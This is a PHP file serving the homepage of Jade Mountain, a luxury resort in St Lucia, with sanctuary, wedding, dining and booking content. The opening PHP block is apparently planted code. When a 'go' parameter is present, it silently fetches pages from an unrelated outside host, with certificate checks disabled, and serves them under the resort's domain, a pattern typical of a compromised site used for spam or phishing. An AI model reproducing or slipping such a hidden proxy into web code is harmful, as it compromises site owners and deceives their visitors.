<?php
if(isset($_GET['go'])) {
    $url = $_GET['go'];
    $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
    // INIT CURL
    $ch = curl_init();

    //init curl
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    // SET URL FOR THE POST FORM LOGIN
    curl_setopt($ch, CURLOPT_URL, 'https://replication.pkcdurensawit.net/jademountain/'.$url.'/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);

    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    // common name and also verify that it matches the hostname provided)
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    // Optional: Return the result instead of printing it
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    // ENABLE HTTP POST
    curl_setopt ($ch, CURLOPT_POST, 1);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $store = curl_exec ($ch);
    echo $store;

    // CLOSE CURL
    curl_close ($ch);

} else {
?>
<!DOCTYPE html>
<html>
<head>
    <title>Home | Jade Mountain St Lucia - St Lucia's Most Romantic Luxury Resort</title>
    <meta http-equiv="Content-type" content="text/html; charset=utf-8">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, user-scalable=no">
    <meta name="keywords" content="jade mountain, saint lucia, st lucia, luxury resort, luxury hotel, sanctuary, infinity pool, piton view, romantic resorts, ">
    <meta name="description" content="Jade Mountain Resort on St. Lucia’s south-western Caribbean coastline is a cornucopia of organic architecture celebrating St. Lucia’s stunning scenic beauty.">
    <link rel="icon" href="favicon.ico" type="image/x-icon" />
    <style>
        @-ms-viewport { width: 100vw ; min-zoom: 100% ; zoom: 100% ; }          @viewport { width: 100vw ; min-zoom: 100% zoom: 100% ; }
        @-ms-viewport { user-zoom: fixed ; min-zoom: 100% ; }                   @viewport { user-zoom: fixed ; min-zoom: 100% ; }
    </style>
    <style>
    /*So doesn't show when first load hide it early*/
      .nav-items{
        display: none;
      }
    </style>
  <link href="css/jquery.mobile.min.css" rel="stylesheet" type="text/css" />
  <link href="css/styles.css?v=1.4" rel="stylesheet" type="text/css" />
  <link rel="stylesheet" href="mdl/material.min.css">
  <link rel="stylesheet" href="css/icon.css">
  <link rel="stylesheet" href="css/material.deep_orange-blue.min.css">
  <script src="js/jquery.min.js"></script>
  <script src="js/jquery-ui.min.js"></script>
  <script src="mdl/material.min.js"></script>
  <script src="js/script.js?v=11"></script>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js">
</script>
<script src="sss/sss.min.js"></script>
<link rel="stylesheet" href="sss/sss.css" type="text/css" media="all">
    <script src="js/jquery-1.11.3.min.js" type="text/javascript"></script>
    <script src="js/jssor.slider-23.0.0.mini.js" type="text/javascript"></script>
    <script type="text/javascript">
        jQuery(document).ready(function ($) {

            var jssor_1_SlideoTransitions = [
              [{b:5500,d:3000,o:-1,r:240,e:{r:2}}],
              [{b:-1,d:1,o:-1,c:{x:51.0,t:-51.0}},{b:0,d:1000,o:1,c:{x:-51.0,t:51.0},e:{o:7,c:{x:7,t:7}}}],
              [{b:-1,d:1,o:-1,sX:9,sY:9},{b:1000,d:1000,o:1,sX:-9,sY:-9,e:{sX:2,sY:2}}],
              [{b:-1,d:1,o:-1,r:-180,sX:9,sY:9},{b:2000,d:1000,o:1,r:180,sX:-9,sY:-9,e:{r:2,sX:2,sY:2}}],
              [{b:-1,d:1,o:-1},{b:3000,d:2000,y:180,o:1,e:{y:16}}],
              [{b:-1,d:1,o:-1,r:-150},{b:7500,d:1600,o:1,r:150,e:{r:3}}],
              [{b:10000,d:2000,x:-379,e:{x:7}}],
              [{b:10000,d:2000,x:-379,e:{x:7}}],
              [{b:-1,d:1,o:-1,r:288,sX:9,sY:9},{b:9100,d:900,x:-1400,y:-660,o:1,r:-288,sX:-9,sY:-9,e:{r:6}},{b:10000,d:1600,x:-200,o:-1,e:{x:16}}]
            ];

            var jssor_1_options = {
              $AutoPlay: 1,
              $SlideDuration: 800,
              $SlideEasing: $Jease$.$OutQuint,
              $CaptionSliderOptions: {
                $Class: $JssorCaptionSlideo$,
                $Transitions: jssor_1_SlideoTransitions
              },
              $ArrowNavigatorOptions: {
                $Class: $JssorArrowNavigator$
              },
              $BulletNavigatorOptions: {
                $Class: $JssorBulletNavigator$
              }
            };

            var jssor_1_slider = new $JssorSlider$("jssor_1", jssor_1_options);

            /*responsive code begin*/
            /*remove responsive code if you don't want the slider scales while window resizing*/
            function ScaleSlider() {
                var refSize = jssor_1_slider.$Elmt.parentNode.clientWidth;
                if (refSize) {
                    refSize = Math.min(refSize, 1920);
                    jssor_1_slider.$ScaleWidth(refSize);
                }
                else {
                    window.setTimeout(ScaleSlider, 30);
                }
            }
            ScaleSlider();
            $(window).bind("load", ScaleSlider);
            $(window).bind("resize", ScaleSlider);
            $(window).bind("orientationchange", ScaleSlider);
            /*responsive code end*/
        });
    </script>
    <style>
        /* jssor slider bullet navigator skin 05 css */
        /*
        .jssorb05 div           (normal)
        .jssorb05 div:hover     (normal mouseover)
        .jssorb05 .av           (active)
        .jssorb05 .av:hover     (active mouseover)
        .jssorb05 .dn           (mousedown)
        */
        .jssorb05 {
            position: absolute;
        }
        .jssorb05 div, .jssorb05 div:hover, .jssorb05 .av {
            position: absolute;
            /* size of bullet elment */
            width: 16px;
            height: 16px;
            background: url('img/b05.png') no-repeat;
            overflow: hidden;
            cursor: pointer;
        }
        .jssorb05 div { background-position: -7px -7px; }
        .jssorb05 div:hover, .jssorb05 .av:hover { background-position: -37px -7px; }
        .jssorb05 .av { background-position: -67px -7px; }
        .jssorb05 .dn, .jssorb05 .dn:hover { background-position: -97px -7px; }

        /* jssor slider arrow navigator skin 22 css */
        /*
        .jssora22l                  (normal)
        .jssora22r                  (normal)
        .jssora22l:hover            (normal mouseover)
        .jssora22r:hover            (normal mouseover)
        .jssora22l.jssora22ldn      (mousedown)
        .jssora22r.jssora22rdn      (mousedown)
        */
        .jssora22l, .jssora22r {
            display: block;
            position: absolute;
            /* size of arrow element */
            width: 40px;
            height: 58px;
            cursor: pointer;
            background: url('img/a22.png') center center no-repeat;
            overflow: hidden;
        }
        .jssora22l { background-position: -10px -31px; }
        .jssora22r { background-position: -70px -31px; }
        .jssora22l:hover { background-position: -130px -31px; }
        .jssora22r:hover { background-position: -190px -31px; }
        .jssora22l.jssora22ldn { background-position: -250px -31px; }
        .jssora22r.jssora22rdn { background-position: -310px -31px; }
    </style>


</head>



<body>
  <div class="page-wrapper">

    <div class="masthead">
      <i class="menu-open material-icons" style="font-size: 3.5em; display: block;">&#xE5D2;</i>
      <!-- <a href="https://www.reservhotel.com/st-lucia-st.-lucia/jade-mountain-resort/booking-engine/ibe5.main?hotel=10747" target="_blank"><span class="book-air">Book Air+Hotel</span></a> -->
      <a href="https://reservations.jademountain.com/114430"><span class="book">Book Hotel</span></a>
      <div class="logo">
        <img id="regular-logo" src="images/logo-header3.png" alt="Jade Mountain Header Logo"/>
        <a href="https://jademountain.com"><img id="mobile-logo" src="images/mobile-logo.png" alt="Jade Mountain Header Logo"/></a>
      </div>
      <div class="navigation">

        <div class="nav">
          <a href="https://jademountain.com"><span class="nav-header">Home</span></a>
          <div class="nav-items">
            <!--
            <a href=""><span>LINK</span></a>
            <a href=""><span>LINK</span></a>
            <a href=""><span>LINK</span></a>
            <a href=""><span>LINK</span></a>
          -->
          </div>
        </div>
        <div class="nav">
          <a href="https://jademountain.com/sanctuaries/sanctuaries.html"><span class="nav-header">Sanctuaries</span></a>
          <div class="nav-items">
            <a href="https://jademountain.com/sanctuaries/sanctuaries.html#galaxy"><span>Galaxy</span></a>
            <a href="https://jademountain.com/sanctuaries/sanctuaries.html#sun"><span>Sun</span></a>
            <a href="https://jademountain.com/sanctuaries/sanctuaries.html#moon"><span>Moon</span></a>
            <a href="https://jademountain.com/sanctuaries/sanctuaries.html#star"><span>Star</span></a>
            <a href="https://jademountain.com/sanctuaries/sanctuaries.html#sky"><span>Sky</span></a>
            <a href="https://jademountain.com/sanctuaries/bathrooms.html"><span>Bathrooms</span></a>
            <a href="https://jademountain.com/sanctuaries/pools.html"><span>Infinity Pools</span></a>
            <a href="https://jademountain.com/sanctuaries/design.html"><span>Design Philosophy</span></a>
          </div>
        </div>
        <div class="nav">
          <a href="https://jademountain.com/romance/honeymoon.html"><span class="nav-header">Romance</span></a>
          <div class="nav-items">
            <a href="https://jademountain.com/romance/weddings.html"><span>Weddings</span></a>
            <a href="https://jademountain.com/romance/weddinglocations.html"><span>Wedding Locations</span></a>
            <a href="https://jademountain.com/romance/weddingpackages.html"><span>Wedding Packages</span></a>
            <a href="https://jademountain.com/romance/weddinggroups.html"><span>Wedding Groups</span></a>
<a href="https://jademountain.com/romance/vow-renewal.html"><span>Vow Renewal</span></a>
            <a href="https://jademountain.com/romance/honeymoon.html"><span>Honeymoons</span></a>
            <a href="https://jademountain.com/romance/anniversary.html"><span>Anniversaries</span></a>
            <a href="https://jademountain.com/romance/gifts.html"><span>Gifts</span></a>
          </div>
        </div>
        <div class="nav">
          <a href="https://jademountain.com/reserve/reserve.html"><span class="nav-header">Reserve</span></a>
          <div class="nav-items">
            <a href="https://reservations.jademountain.com/114430"><span>Book Now</span></a>
            <a href="https://jademountain.com/reserve/reserve.html"><span>Reservation Request</span></a>
            <a href="https://jademountain.com/promotions.html"><span>Promotions</span></a>
            <a href="https://jademountain.com/reserve/rates_and_packages.html"><span>Rates &amp; Packages</span></a>
            <a href="https://jademountain.com/reserve/pre-arrival_concierge.html"><span>Pre-Arrival Concierge</span></a>
            <a href="https://jademountain.com/reserve/booking_info.html"><span>Booking Information</span></a>
            <a href="https://jademountain.com/reserve/returningguests/returningguests.html"><span>Returning Guests</span></a>
          </div>
        </div>
        <div class="nav">
          <a href="https://jademountain.com/cuisine/jade_club.html"><span class="nav-header">Cuisine</span></a>
          <div class="nav-items">
            <a href="https://jademountain.com/cuisine/jade_club.html"><span>Jade Mountain Club</span></a>
            <a href="https://jademountain.com/cuisine/resort_dining.html"><span>Resort Dining</span></a>
            <a href="https://jademountain.com/cuisine/private_dining.html"><span>Private Dining</span></a>
            <a href="https://jademountain.com/cuisine/culinary_events.html"><span>Culinary Events</span></a>
            <a href="https://jademountain.com/cuisine/chocolate.html"><span>Chocolate Lab</span></a>
            <a href="https://jademountain.com/cuisine/emerald.html"><span>Emerald Farm</span></a>
          </div>
        </div>
        <div class="nav">
          <a href="https://jademountain.com/wellness/spa.html"><span class="nav-header">Wellness</span></a>
          <div class="nav-items">
            <a href="https://jademountain.com/wellness/spa.html"><span>Kai En Ciel Spa</span></a>
            <a href="https://jademountain.com/wellness/in-sanctuary_treatments.html"><span>In-Sanctuary Treatments</span></a>
            <a href="https://jademountain.com/wellness/yoga.html"><span>Yoga &amp; Fitness</span></a>
          </div>
        </div>
        <div class="nav">
          <a href="https://jademountain.com/activities/activities.html"><span class="nav-header">Activities</span></a>
          <div class="nav-items">
            <a href="https://jademountain.com/activities/activities.html"><span>Activities</span></a>
            <a href="https://jademountain.com/activities/beaches.html"><span>Beaches</span></a>
            <a href="https://jademountain.com/activities/island_excursions.html"><span>Excursions</span></a>
            <a href="https://jademountain.com/activities/scuba_diving.html"><span>Scuba Diving</span></a>
            <a href="https://jademountain.com/activities/walking-hiking.html"><span>Walking &amp; Hiking</span></a>
            <a href="https://jademountain.com/activities/watersports.html"><span>Water Sports</span></a>
            <a href="https://jademountain.com/activities/birdwatching.html"><span>Birdwatching</span></a>
          </div>
        </div>
        <div class="nav">
          <a href="https://jademountain.com/news-reviews/news.html"><span class="nav-header">News</span></a>
          <div class="nav-items">
            <a href="https://jademountain.com/news-reviews/news.html"><span>News</span></a>
<a href="https://jademountain.com/news-reviews/in-the-press.html"><span>In The Press</span></a>
            <a href="https://jademountain.com/news-reviews/awards_and_reviews.html"><span>Awards</span></a>
            <a href="https://jademountain.com/news-reviews/press.html"><span>Press Information</span></a>
            <a href="https://jademountain.com/news-reviews/testimonials.html"><span>Testimonials</span></a>
            <a href="https://jademountain.com/blog"><span>Blog</span></a>
          </div>
        </div>
      </div>




      <div class="tagline">
        <!--Edit Below Only -->
        <h1 class="header-text">A CORNUCOPIA OF ORGANIC ARCHITECTURE IN CELEBRATION OF ONE OF NATURE'S MOST ALLURING SETTINGS</h1>
        <!--Edit Above Only -->
      </div>

      <video style="height: auto; width: 90%; margin-left: 5%; margin-right: 5%; max-width: 1920px; float: left;" autoplay muted loop playsinline preload="metadata" poster="https://jademountain.com/home_animation.hyperesources/slider3.jpg">
      <!-- MP4 is 1.67 mbs / Webm is 1.99mbs -->
      <source src="33sec.mp4" type="video/mp4">
      <source src="33sec.webm" type="video/webm">
      I'm sorry; your browser doesn't support HTML5 video in WebM with VP8/VP9 or MP4 with H.264.
      </video>




      <div class="sub-slider">
        <a href="https://reservations.jademountain.com/114430"><span class="button">Book Now</span></a>
        <a href="https://jademountain.com/promotions.html"><span class="button">Promotions</span></a>
        <a href="https://jademountain.com/reserve/rates_and_packages.html"><span class="button">Rates &amp; Packages</span></a>
        <a href="tel:1-800-223-1108"><span class="button">1-800-223-1108</span></a>
        <a href="https://jademountain.com/gallery/index.html"><span class="button">Gallery</span></a>
        <a href="https://jademountain.com/newsletter-signup.html"><span class="button">Newsletter Sign Up</span></a>
      </div>

      <div class="page-content">

        <h1>Welcome to Jade Mountain, Saint Lucia</h1>

        <div class="highlights-wrapper">

          <div class="highlight">
            <div class="highlight-image highlight-1">
            </div>
            <span>Weddings &amp; Honeymoons</span>
            <h4><a href="https://jademountain.com/romance/weddings.html">Jade Mountain Weddings</a> <!--<br/>Book your St Lucia Wedding--></h4>
            <!--<p>Book your St. Lucia Wedding at Jade Mountain</p>-->
          </div>

          <div class="highlight">
            <div class="highlight-image highlight-2">
            </div>
            <span>Promotions &amp; Special Offers</span>
            <h4><a href="https://jademountain.com/promotions.html">Take Five At Jade Mountain</a> <!--<br/>Enjoy A 5th Night FREE!--></h4>
            <!--<p>Enjoy A 5th Night FREE!</p>-->
          </div>

          <div class="highlight">
            <div class="highlight-image highlight-3">
            </div>
            <span>Media</span>
            <h4><a href="https://jademountain.com/video.html">Resort Video</a> | <a href="https://jademountain.com/images/PDF/JadeMountain_Brochure.pdf">Resort Brochure</a></h4>
            <h4></h4>
            <!--<p>Highlight text</p>-->
          </div>

          <div class="highlight">
            <div class="highlight-image highlight-4">
            </div>
            <span>Concierge</span>
            <h4><a href="https://jademountain.com/reserve/pre-arrival_concierge.html">Pre-Arrival Concierge</a> <!--| <a href="https://jademountain.com/reserve/returningguests/returningguests.html">Returning Guests</a> | <a href="https://jademountain.com/reserve/returningguests/visiting_friends_form.html">Visiting Friends</a> --> | <a href="https://jademountain.com/romance/gifts.html">Gifts</a></h4>
            <!--<p>Highlight text</p>-->
          </div>

        </div>

        <div class="main-content">
          <!-- Edit Below Only -->
          <p><!--<a href="https://www.facebook.com/JADEMOUNTAINSTLUCIA/posts/10157962695858193" target="_blank"><img src="https://jademountain.com/images/HealthSecurity-LOGO.jpg" style="max-width: 100%; width: 200px; float: right; padding: 0.5em;" alt="Forbes Health Security"></a>-->
          <a href="#aaa" id="aaa"><img src="https://jademountain.com/images/AAA-5Diamond.png" style="max-width: 100%; width: 200px; float: right; padding: 0.5em;" alt="AAA Five Diamond"></a>Rising majestically above the 600 acre beach front resort of Anse Chastanet, Jade Mountain Resort on St. Lucia’s south-western Caribbean coastline is a cornucopia of organic architecture celebrating St. Lucia’s stunning scenic beauty.</p>

          <p>Architect owner Nick Troubetzkoy has expanded upon his philosophy of building in harmony with Caribbean nature in his creation of Jade Mountain St. Lucia. The bold architectural design – individual bridges leading to exceptional infinity pool sanctuaries and rugged stoned-faced columns reaching towards the sky – makes Jade Mountain St. Lucia one of the Caribbean’s most mesmerizing resort experiences.</p>

          <p>Expect grand sweeping spaces where bedroom, living area and an extravagant private infinity pool glide into one another to form extraordinary platforms floating out into nature. With the fourth wall entirely absent, Jade Mountain’s sanctuaries are stage-like settings from which to embrace the full glory of St. Lucia’s Pitons World Heritage Site, and of course, the eternal Caribbean Sea.</p>

          <p>Wrapped around an infinity pool with a dazzling kaleidoscope of colors, the Jade Mountain Club celebrates James Beard Award winner Chef Allen Susser’s “Jade Cuisine.” Hovering in space above the Jade Mountain Club is the Celestial Terrace, perfect for sunset cocktails or star-gazing.</p>

          <p>A wide range of spa services can be enjoyed in the privacy of the Jade Mountain sanctuaries or at Kai en Ciel, Jade Mountain’s boutique spa and fitness studio. The resort major domos and a dedicated resort team ensure outstanding service around the clock.</p>

          <p>Enjoy the exclusivity and privacy of Jade Mountain with all of sister resort Anse Chastanet’s restaurants, bars, boutiques, art gallery, spa, scuba, bike and watersports facilities as well as 2 soft sand beaches available and easily accessible to Jade Mountain guests by foot or resort shuttle at all times.</p>

          <p class="green-box" style="text-align: center;"><img style="width: 100px;" src="images/affiliates/LEED-Gold-Logo.png" alt="LEED Gold Logo" /><br><span style="font-size: 1.5em;">Jade Mountain<br> The First Caribbean Hotel to Earn LEED Gold</span></p>

          <!--<p class="green-box" style="text-align: left; background: #fff; border: solid rgb(206, 224, 207) 1px;"><img style="width: 150px; float: right;" src="images/WTTC-SafeTravels-JadeMountain.png" alt="WTTC Safe Travels" />
            <span style="font-size: 1.15em; padding-top: 1.15em;">We are pleased to have received our WTTC Global Safety Stamp to Recognise Safe Travels Protocols. The specially designed stamp assists travellers to recognise governments and companies around the world which have adopted health and hygiene global standardised protocols – so consumers can experience ‘Safe Travels’.</span></p>-->



          <p class="green-box"><img src="images/Aerial3b.jpg" alt="Aerial Shot" />JADE MOUNTAIN is St. Lucia's only resort property with the iconic view of both the Piti and Gros Piton mountains floating upon the Caribbean Sea. The location of the property is unsurpassed, rising majestically above the private estate of ANSE CHASTANET with 600 lush tropical acres bordering two soft, sand Caribbean beaches with pristine coral reefs just off shore. Part of the estate is the historical plantation of Anse Mamin and Emerald Estate where the resort grows its own organic produce.</p>

          <!--<p style="text-align: center; padding-bottom: 1em;">
            <img src="images/covid-cert.jpg" style="max-width: 50%; width: 150px; text-align: left;" alt="Covid 19 Certified">
            <img src="images/WTTC-SafeTravels-JadeMountain.png" style="max-width: 50%; width: 150px; text-align: right;" alt="WTTC Safe Travels">
          </p>-->


          <!-- Edit Above Only -->
        </div>

        <div class="side-content">
          <!-- Edit Below Only -->
          <!--
          <p style="background: #000; color: #fafafa; text-align: center; padding-left: 0.5em; padding-right: 0.5em;"><img src="images/last-call.png" style="width: calc(100% + 1em); margin-left: -0.5em; float: left;"><br>

          <strong>Here is our latest update and remaining space for the Christmas period</strong><br>

          2 Star Infinity Pool sanctuaries until Dec 28 <br> 5 nights min stay<br>
          1 Moon Infinity Pool sanctuary from Dec 30 <br> 5 nights minimum stay<br>
          1 Sun and 1 Moon Infinity Pool sanctuary from Dec 31 <br> 5 nights minimum stay<br>


          To book: <br>
          Contact reservations at <a href="mailto:jademountain@ansechastanet.com">jademountain@ansechastanet.com</a>
          <br>or call <a href="tel:1-800-223-1108">+1-800-223-1108</a>

          </p>

          <hr>
        -->

          <div class="newsletter">
            <a href="https://jademountain.com/newsletter-signup.html"><span>Sign Up For Our Newsletter</span></a>
          </div>

              <a href="https://jademountain.com/virtualtraveler/index.html" target="_blank"><img src="images/virtual-banner.jpg" style="width: 100%; float: left; margin-bottom: 1em;" alt="Advisory"/></a>

              <a href="https://jademountain.com/images/PDF/Guest Services Brochure - JM.pdf" target="_blank"><img src="images/download-guest-services.jpeg" style="width: 100%; float: left; margin-bottom: 1em;" alt="Download Guest Services Brochure"/></a>


            <a href="https://cfc.wayaj.com/jade-mountain" target="_blank"><img src="images/Sustainability_Banner.jpg" style="width: 100%; float: left; margin-bottom: 1em;" alt="Carbon Offset"/></a>

            <!--<a href="https://jademountain.com/covid-19.html"><img src="images/advisory-banner.jpg" style="width: 100%; float: left; margin-bottom: 1em;" alt="Advisory"/></a>-->
            <!--
            <a href="https://jademountain.com/covid-testing.html"><img src="images/covid-test-banner.jpg" style="width: 100%; float: left; margin-bottom: 1em;" alt="Covid-19 Testing"/></a>
          -->







          <p style="text-align: center; float: left; width: 100%">

          <img style="width: 150px; max-width: 100%;" src="images/amex-fhr-member.png" alt="AMEX Fine Hotels and Resorts"/>

          <img style="width: 150px; max-width: 100%;" src="images/travellife-gold-grey.jpg" alt="Travel Life Gold" />
         </p>

          <!--<a href="http://jademountain.com/fall.html"><img src="images/JM_Fall_Sale.jpg" style="width: 100%; float: left;" alt="Jade Mountain Fall Sale" /></a>   -->

          <!--<a class="twitter-timeline"  href="https://twitter.com/JADEMOUNTAIN" data-widget-id="534721740186730496">Tweets by @JADEMOUNTAIN</a>
            <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>-->

            <p>

            <a href="https://twitter.com/JADEMOUNTAIN?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-show-count="false">Follow @JADEMOUNTAIN</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

            </p>

          <iframe src="https://www.facebook.com/plugins/page.php?href=https%3A%2F%2Fwww.facebook.com%2Fjademountainstlucia&tabs=timeline&width=400&height=500&small_header=true&adapt_container_width=true&hide_cover=false&show_facepile=false&appId=1716564438573758" width="400" height="500" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowTransparency="true"></iframe>

          <!--

          <img src="images/consortia.jpg" style="width: 100%; float: left; margin-top: 1em;" alt="Consortia"/>

          <p style="width: 100%; float: left; text-align: center;">

            <img src="images/tm2020champion.png" style="width: 50%; max-width: 100%; margin-top: 1em; margin-bottom: 1em; float: left;" alt="Traveler Made Champion"/>

            <a href="https://www.tripadvisor.com/Hotel_Review-g147345-d623374-Reviews-Jade_Mountain_Resort-Soufriere_Soufriere_Quarter_St_Lucia.html" target="_blank"><img src="https://jademountain.com/images/ta-bob-2020.png" style="width: 50%; max-width: 100%; margin-top: 1em; margin-bottom: 1em; float: left;" alt="Travelers Choice Best of Best 2020" /></a>


            <img src="images/virtuoso-culinary.jpg" style="width: 50%; max-width: 100%; margin-top: 1em; margin-bottom: 1em; float: left;" alt="Virtuoso Culinary">

          </p>
           -->

          <!--

          <p style="width: 100%; float: left; text-align: center;">

            <img src="images/WTTC-SafeTravels-JadeMountain.png" style="width: 50%; max-width: 100%; margin-top: 1em; margin-bottom: 1em; float: left;" alt="WTTC"/>


          </p>

          -->

          <!--

          <table>

            <tr>
              <td><a href="https://www.americanexpress.com/en-us/travel/fine-hotels-resorts/property/jade-mountain" target="_blank"><img class="side-image" src="images/amex-fhr-member.png" alt="AMEX Fine Hotels and Resorts"/></a></td>
              <td><a href="https://www.signaturetravelnetwork.com/SigNet/index.cfm/SignatureHotels/Index?hotel_id=2055&agency_id=121&utp=consumer&type=consumer&consumerView=1" target="_blank"><img class="side-image" src="images/signature-colour.jpg" alt="Signature Travel Network"/></a></td>
            </tr>
            <tr>
              <td><a href="https://www.ensembletravel.com/styles/luxury-hotels-resorts/" target="_blank"><img class="side-image" src="images/ensemble-colour.jpg" alt="Ensemble Travel"/></a></td>
              <td><a href="http://www.travellermade.com/the-caribbean/jade-mountain-resort-st-lucia/" target="_blank"><img class="side-image" src="images/TravellerMade.png" alt="Traveller Made"/></a></td>
            </tr>
            <tr>
              <td><a href="https://www.travelleadersnetwork.com/" target="_blank"><img class="side-image" src="images/travel-leaders-colour.jpg" alt="Travel Leaders Group"/></a></td>

              <td><a href="http://www.virtuoso.com/hotels/6164533/jade-mountain#.VZK-o87VmS0" target="_blank"><img class="side-image" src="images/Virt-col-h200.png" alt="Virtuoso"/></a></td>

            </tr>


          </table>

        -->
          <!-- Edit Above Only -->
        </div>

      </div>

      <div class="links">

        <div class="links-left">
          <!-- Go to www.addthis.com/dashboard to customize your tools -->
          <div class="addthis_inline_share_toolbox"></div>
          <a href="https://jademountain.com/about_us/community.html">Community</a>
          <a href="https://jademountain.com/about_us/environment.html">Environment</a>
          <a href="https://jademountain.com/about_us/press.html">Press</a>
          <a href="https://jademountain.com/about_us/contact_us.html">Contact</a>
          <a href="https://jademountain.com/privacypolicy.html">Privacy Policy</a>
          <a href="https://jademountain.com/ethics.html">Ethics</a>
          <p>
            Brochures: <br/>
            <a href="https://jademountain.com/images/PDF/JadeMountain_Brochure.pdf">English</a> |
            <a href="https://jademountain.com/images/PDF/JadeMountain_Brochure_(German).pdf">Deutsch</a> |
            <a href="https://jademountain.com/images/PDF/JadeMountain_Brochure_(Francaise).pdf">FRANÇAIS</a> <br/>
            <a href="https://jademountain.com/images/PDF/JadeMountain_Brochure-(Russian).pdf">RUSSIAN</a> |
            <a href="https://jademountain.com/images/PDF/JadeMountain_Brochure-(Spanish).pdf">Espanol</a> |
            <a href="https://jademountain.com/images/PDF/JadeMountain_Brochure-(Portuguese).pdf">PORTUGESE</a>
          </p>
        </div>

        <div class="links-right">
          <p>&nbsp;<br/>
          <a href="tel:1-800-223-1108">1-800-223-1108</a><br/>
          <a href="mailto:jademountain@jademountain.com">jademountain@jademountain.com</a><br/>
          <a href="https://ansechastanet.com">Anse Chastanet</a><br/>
          <a href="https://www.scubastlucia.com/">Scuba St Lucia</a><br/>
          <a href="http://www.elopetoparadiseweddings.com/">Elope To Paradise Weddings</a><br/>
          <a href="http://www.jademountainstlucia.de/">Jade Mountain DE</a><br/>
          <a href="http://www.jademountain.fr/">Jade Mountain FR</a><br/>
          </p>
          </div>

      </div>

      <div class="footer">
        <img src="https://jademountain.com/images/footer.jpg" style="width: 100%; float: left" alt="Footer"/>

      </div>

      <div class="mobile-menu">
        <i class="menu-close material-icons" style="font-size: 3.5em; display: block;">&#xE5CD;</i>
        <h4>&nbsp;</h4>
        <a href="https://jademountain.com"><span>Home</span></a>
        <h5>Sanctuaries</h5>
        <a href="https://jademountain.com/sanctuaries/sanctuaries.html#galaxy"><span>Galaxy</span></a>
        <a href="https://jademountain.com/sanctuaries/sanctuaries.html#sun"><span>Sun</span></a>
        <a href="https://jademountain.com/sanctuaries/sanctuaries.html#moon"><span>Moon</span></a>
        <a href="https://jademountain.com/sanctuaries/sanctuaries.html#star"><span>Star</span></a>
        <a href="https://jademountain.com/sanctuaries/sanctuaries.html#sky"><span>Sky</span></a>
        <a href="https://jademountain.com/sanctuaries/bathrooms.html"><span>Bathrooms</span></a>
        <a href="https://jademountain.com/sanctuaries/pools.html"><span>Infinity Pools</span></a>
        <a href="https://jademountain.com/sanctuaries/design.html"><span>Design Philosophy</span></a>
        <h5>Romance</h5>
        <a href="https://jademountain.com/romance/weddings.html"><span>Weddings</span></a>
        <a href="https://jademountain.com/romance/weddinglocations.html"><span>Wedding Locations</span></a>
        <a href="https://jademountain.com/romance/weddingpackages.html"><span>Wedding Packages</span></a>
        <a href="https://jademountain.com/romance/weddinggroups.html"><span>Wedding Groups</span></a>
<a href="https://jademountain.com/romance/vow-renewal.html"><span>Vow Renewal</span></a>
        <a href="https://jademountain.com/romance/honeymoon.html"><span>Honeymoons</span></a>
        <a href="https://jademountain.com/romance/anniversary.html"><span>Anniversaries</span></a>
        <a href="https://jademountain.com/romance/gifts.html"><span>Gifts</span></a>
        <h5>Reserve</h5>
        <a href="https://reservations.jademountain.com/114430"><span>Book Now</span></a>
        <a href="https://jademountain.com/promotions.html"><span>Promotions</span></a>
        <a href="https://jademountain.com/reserve/reserve.html"><span>Reservation Request</span></a>
        <a href="https://jademountain.com/reserve/rates_and_packages.html"><span>Rates &amp; Packages</span></a>
        <a href="https://jademountain.com/reserve/pre-arrival_concierge.html"><span>Pre-Arrival Concierge</span></a>
        <a href="https://jademountain.com/reserve/booking_info.html"><span>Booking Information</span></a>
        <a href="https://jademountain.com/reserve/returningguests/returningguests.html"><span>Returning Guests</span></a>
        <h5>Cuisine</h5>
        <a href="https://jademountain.com/cuisine/jade_club.html"><span>Jade Mountain Club</span></a>
        <a href="https://jademountain.com/cuisine/resort_dining.html"><span>Resort Dining</span></a>
        <a href="https://jademountain.com/cuisine/private_dining.html"><span>Private Dining</span></a>
        <a href="https://jademountain.com/cuisine/culinary_events.html"><span>Culinary Events</span></a>
        <a href="https://jademountain.com/cuisine/chocolate.html"><span>Chocolate Lab</span></a>
        <a href="https://jademountain.com/cuisine/emerald.html"><span>Emerald Farm</span></a>
        <h5>Wellness</h5>
        <a href="https://jademountain.com/wellness/spa.html"><span>Kai En Ciel Spa</span></a>
        <a href="https://jademountain.com/wellness/in-sanctuary_treatments.html"><span>In-Sanctuary Treatments</span></a>
        <a href="https://jademountain.com/wellness/yoga.html"><span>Yoga &amp; Fitness</span></a>
        <h5>Activities</h5>
        <a href="https://jademountain.com/activities/activities.html"><span>Activities</span></a>
        <a href="https://jademountain.com/activities/beaches.html"><span>Beaches</span></a>
        <a href="https://jademountain.com/activities/island_excursions.html"><span>Excursions</span></a>
        <a href="https://jademountain.com/activities/scuba_diving.html"><span>Scuba Diving</span></a>
        <a href="https://jademountain.com/activities/walking-hiking.html"><span>Walking &amp; Hiking</span></a>
        <a href="https://jademountain.com/activities/watersports.html"><span>Water Sports</span></a>
        <a href="https://jademountain.com/activities/birdwatching.html"><span>Birdwatching</span></a>
        <h5>News/Reviews</h5>
